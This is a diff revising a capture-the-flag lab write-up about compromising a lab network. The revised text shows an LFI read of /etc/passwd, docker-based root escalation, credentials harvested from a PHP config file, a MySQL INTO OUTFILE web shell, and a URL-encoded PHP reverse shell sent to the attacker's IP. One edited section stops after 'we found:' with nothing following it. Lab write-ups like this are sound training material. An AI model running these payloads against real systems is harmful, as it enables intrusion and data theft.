@@ -898,15 +898,46 @@ The IP refers to my tun0 interface, of course.
 
 Once I got a shell, inspecting network configuration we can see that we are inside the network
 
-    192.168.100.0/24
-
-Our IP is 192.168.100.100
+    eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
+        inet 192.168.100.100  netmask 255.255.255.0
 
 ### Flag submission 1
 In /var subdirs you can find the first flag.
 
+### Privilege escaltion (without result)
+At this point I performed some basic controls to try to escalate my privileges. I searched for files containing juicy information:
+
+    grep -Ril "password" /var/www  2> /dev/null
+    ...
+    grep -Ril "password" /home 2> /dev/null
+    ...
+
+Nothing really interesting emerged. 
+
+I searched for SUID file, but again, with no luck:
+
+    find / -perm -u=s -type f 2>/dev/null
+    /usr/lib/eject/dmcrypt-get-device
+    ...
+    /usr/bin/docker
+    ...
+
+Actually I didn't know how to abuse of docker binary to privilege escalation. Searching around I found this [resource](https://gtfobins.github.io/gtfobins/docker). I took me a while to realize what is this alpine value used in the sample command: that is the name of a running docker image.
+We can search for running docker images as follows:
+
+    docker images -a
+    ....
+    <none>              <none>              d9c4bf86bc87        3 years ago         63.5MB
+    ubuntu              18.04               56def654ec22        3 years ago         63.2MB
+
+The last result row is the one we can use as value for the it parameter:
+
+    docker run -v /:/mnt --rm -i ubuntu:18.04 chroot /mnt bash
+
+Performing other activities to find a way to escalate my privilege, but I didn't find anything
+
 ### Pivoting
-As usual to perform this task I use Ligolo-NG. I downloaded it from attacker machine, since wget it's not installed I used curl:
+At this point I decided to move forward and perform an host scan on the subnet using the compromised machine as pivot host. As usual to perform this task I use Ligolo-NG. I downloaded the agent from attacker machine, since wget it's not installed I used curl:
 
     cd /tmp && curl -O http://10.50.74.35:8000/agent
     chmod u+x agent
@@ -950,45 +981,121 @@ Apart the victim, we found another active host in the network, that actualy is t
     8080/tcp  open  http-proxy syn-ack
     33060/tcp open  mysqlx     syn-ack
 
-The wonderful thing of ligolo-ng is that it operates in a tunnell mode, like a VPN, so we can directly visit the http services with our browser. Actually we found a copy of the the main site on port 80 and a copy of the dev site on 8080. Again I used the LFI vulnerability to download <b>/etc/passwd</b> file, even if generally it's not useful in modern Linux system, this time I found an entry that I tried to reverse using hashcat:
+The wonderful thing of ligolo-ng is that it operates in a tunnell mode, like a VPN, so we can directly visit the http services with our browser. Actually we found a copy of the the main site on port 80 and a copy of the dev site on 8080. Again I used the LFI vulnerability to download <b>/etc/passwd</b> file:
 
-    zeus:$6$Zs4KmlUsMiwVLy2y$V8S5G3q7tpBMZip8Iv/H6i5ctHVFf6.fS.HXBw9Kyv96Qbc2ZHzHlYHkaHm8A5toyMA3J53JU.dc6ZCjRxhjV1:0:0:root:/root:/bin/bash
-Probably the entry was created by another user in the LAB to have persistence on the system, so probably once the Lab is reset you wont find this account anymore. There is another way of course that involves to have access as non privileged user to the system to escalate to root, I will cover it at the end of this section. Anyway I proceeded tryning to reverse the user password, since that user will have a root shell once logged in, for sure it deserves a try:
-I run hashcat on my winzoz box to take advantage of my GPU:
+    http://192.168.100.1:8080/img.php?file=/etc/passwd
+Even this time I didn't find any hashed password in this file. At this point I come back to search useful information on the compromised server (192.168.100.100). I found some interesting files that I missed before:
 
-    hashcat.exe -a 0 -m 1800 zeux.txt C:\Users\filippo\wordlist\rockyou.txt
+    www-data@0609ee91af49:/var/www/admin$ ls
+    ls
+    action_page.php
+    assets
+    dashboard.php
+    db_connect.php
     ...
-    $6$Zs4KmlUsMiwVLy2y$V8S5G3q7tpBMZip8Iv/H6i5ctHVFf6.fS.HXBw9Kyv96Qbc2ZHzHlYHkaHm8A5toyMA3J53JU.dc6ZCjRxhjV1:lxxxxxxxx
-    Session..........: hashcat
-    Status...........: Cracked
+
+Looking at the DB connect file we can get the credentials to access mysql DB:
+
+    cat db_connect.php
+    <?php
     
-[//]: # (linuxrulez)
+    define('DB_SRV', '192.168.100.1');
+    define('DB_PASSWD', "!123SecureAdminDashboard321!");
+    define('DB_USER', 'admin');
+    define('DB_NAME', 'DashboardDB');
+    
+    $connection = mysqli_connect(DB_SRV, DB_USER, DB_PASSWD, DB_NAME);
+    
+    if($connection == false){
+    
+            die("Error: Connection to Database could not be made." . mysqli_connect_error());
+    }
+    ?>
+We can try to dump the DB and proceed to download the file, if you prefer you can use the ligolo tunnel to connect directly from your machine to the remote Mysql host. For sake of learning I dumped the DB to a file, saved in a location we have write permission as user www-data, 
+that of course we can reach through HTTP. The following command should be self-explanatory:
 
-To me it tooks 2 minutes to reverse the password having NVIDIA GF 4050. Since port SSH is open we can try to login to the remote host:
+    mysqldump -u admin -h 192.168.100.1 -p DashboardDB > /var/www/wordpress/db.sql
 
-    ssh zeus@192.168.100.1
+Then we can dowload the file hitting the following URL:
 
-    root@ip-10-200-95-33:~# users
-    zeus
-    root@ip-10-200-95-33:~# id zeus 
-    uid=0(root) gid=0(root) groups=0(root)
-    root@ip-10-200-95-33:~# 
-Since the uid for zeus is set to 0, we are root.
+    www.holo.live/db.sql
+
+Inspecting the dump file we can found actually another user (that will be useful later) 
+    
+    ...
+    LOCK TABLES `users` WRITE;
+    /*!40000 ALTER TABLE `users` DISABLE KEYS */;
+    INSERT INTO `users` VALUES ('admin','BBBBBBBBBBBBBBBB'),('gurag','AAAA');
+    ...
+
+Using the same approch we could try to create a reverse shell on the remote host (.1), since mysql user has the permission to write to  /var/www/wordpress location. First we can connect to the remote MySql DBMS:
+
+    mysql -u admin -h 192.168.100.1 -p -e "select '<?php if(isset($_GET[\'c\'])) {system($_GET[\'c\']);} ?>' INTO OUTFILE '/var/www/wordpress/ws.php';"
+    ...
+    Enter password: !123SecureAdminDashboard321!
+    ERROR 1290 (HY000) at line 1: The MySQL server is running with the --secure-file-priv option so it cannot execute this statement
+
+But what happened here? It seems that this flag prevents us to write to a the path we specified. At this point is necessary to connect to the remote Mysql server form the attacker machine. 
+This is easy (you must have mysql client installed on the attacker machine) since we have the ligolo tunnel in place. In case you stopped the agent on the victim:
+restart the agent:
+
+    /tmp/agent -connect 10.50.74.35:11601 -ignore-cert
+
+Then from the attacker machine:
+
+    mysql -u admin -h 192.168.100.1 -p 
+    Enter password: 
+    Welcome to the MariaDB monitor.  Commands end with ; or \g.
+    ...
+
+Then we can inspect the variable related to the flag:
+
+    MySQL [(none)]> SHOW VARIABLES LIKE "secure_file_priv";
+    +------------------+----------------+
+    | Variable_name    | Value          |
+    +------------------+----------------+
+    | secure_file_priv | /var/www/html/ |
+    +------------------+----------------+
+    1 row in set (0.078 sec)
+
+So our shell must be saved according to this value, so this is the working payload:
+
+    MySQL [(none)]> select '<?php if(isset($_GET[\'c\'])) {system($_GET[\'c\']);} ?>' INTO OUTFILE '/var/www/html/ws.php';
+    Query OK, 1 row affected (0.072 sec)
+
+Then we can access the web shell using the following URL:
+
+    http://192.168.100.1/ws.php?c=whoami
+
+<b>Oops! That page can’t be found.</b>
+Damn, so I tried with the other http port available
+
+    http://192.168.100.1:8080/ws.php?c=whoami
+
+This time it worked:
+
+    www-data
+
+At this point we can get a shell using the same payload we used before (remember to start a nc listener on the attacker machine=
+
+     http://192.168.100.1:8080/ws.php?c=php%20-r%20%27%24sock%3Dfsockopen%28%2210.50.74.35%22%2C1222%29%3Bexec%28%22%2Fbin%2Fbash%20-i%20%3C%263%20%3E%263%202%3E%263%22%29%3B%27
+
 ### Flag submissions 2 and 3
 You can find these flags.
 
-Futher investigate the server we notice we landed on the web-server that hosts a Docker container, since the ssh server is active on the Docker interface as well (very insecure configuration):
+Futher investigate the server we notice that the webapp is actually a Docker container, and that the ssh server is active on the Docker interface as well (very insecure configuration):
 
-    ifconfig 
+    www-data@ip-10-200-95-33:/var/www/html$ ifconfig 
     br-19e3b4fa18b8: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
         inet 192.168.100.1  netmask 255.255.255.0  broadcast 192.168.100.255
     ...
     eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 9001
         inet 10.200.95.33  netmask 255.255.255.0  broadcast 10.200.95.255
 
-This configuration permtis us to access the server directly from the attacker machine, through the VPN, without the need of use ligolo tunnell:
+Again I performed the usual step to privilege escalation. This time looking for SUID binary we found:
 
-    ssh zeus@10.200.95.33
+    
+
 
 From this host we can perform a further host discovery on the 10.200.95.0/24 subnet. Luckily nmap is already installed on the server:
 
@@ -1246,7 +1353,7 @@ Then we can start to interact directly with the services for each hosts. I start
      ...
     [!] Aborting remainder of tests since sessions failed, rerun with valid credentials   
 
-Same thing trying with the other hosts. There aren't shares that allows non-authenticated access, so exploit null session is not possible. I gave it a try with the credential I found but I go the same result. Then I decide to inspect the web app hosted on S-SRV01.
+Same fate trying with the other hosts. There aren't shares that allows non-authenticated access, so exploit null session is not possible. I gave it a try with the credential I found but I go the same result. Then I decide to inspect the web app hosted on S-SRV01.
 Visiting http://10.200.95.31 the same login page of admin.holo.live is present. I tried with the same admin credentials but an empty page is returned. I tried to access directly the dashboard, visiting http://10.200.95.31/dashboard.php, but I recived not found error.
 I decided to proceed performing brute-force directory
 
@@ -1293,55 +1400,11 @@ So having a valid user and the corresponding token (sent by email) could permits
     ===============================================================
 
 So there is a reset and even an upload file, but without authentication we are redirected to the index page. So it seems that we have to find a valid user at first. I tried to brute force it with hydra using commons usenames wordlist but without any luck.
-So time to come back to my steps to further enumerate :)
-Coming back to admin.holo.live server (the Docker container hosted we compromise before), through the php reverse shell, I found some interesting files that I missed before:
-
-    www-data@0609ee91af49:/var/www/admin$ ls
-    ls
-    action_page.php
-    assets
-    dashboard.php
-    db_connect.php
-    ...
-
-Looking at the DB connect file we can get the credentials to access mysql DB:
-
-    cat db_connect.php
-    <?php
-    
-    define('DB_SRV', '192.168.100.1');
-    define('DB_PASSWD', "!123SecureAdminDashboard321!");
-    define('DB_USER', 'admin');
-    define('DB_NAME', 'DashboardDB');
-    
-    $connection = mysqli_connect(DB_SRV, DB_USER, DB_PASSWD, DB_NAME);
-    
-    if($connection == false){
-    
-            die("Error: Connection to Database could not be made." . mysqli_connect_error());
-    }
-    ?>
-We can try to dump the DB and proceed to download the file, if you prefer you can use the ligolo tunnel to connect directly from your machine to the remote Mysql host. For sake of learning I dumped the DB to a file, saved in a location we have write permission as user www-data, that of course we can reach with HTTP. The following command should be self-explanatory:
-
-    mysqldump -u admin -h 192.168.100.1 -p DashboardDB > /var/www/wordpress/db.sql
-
-Then we can dowload the file hitting the following URL:
-
-    www.holo.live/db.sql
-
-Inspecting the dump file we can found actually another username:
-    
-    ...
-    LOCK TABLES `users` WRITE;
-    /*!40000 ALTER TABLE `users` DISABLE KEYS */;
-    INSERT INTO `users` VALUES ('admin','DBManagerLogin!'),('gurag','AAAA');
-    ...
-
-I proceeded to try the new found credentials:
+Then I tried with the other credentials found before, dumping users table:
 
     http://10.200.95.31/login.php?user=gurag&password=AAAA
 
-But I got invalid username and password. Then I tried to recover the password:
+But I got invalid username and password, then I visited the password recovery URL:
 
     http://10.200.95.31/password_reset.php?user=gurag&user_token=
 
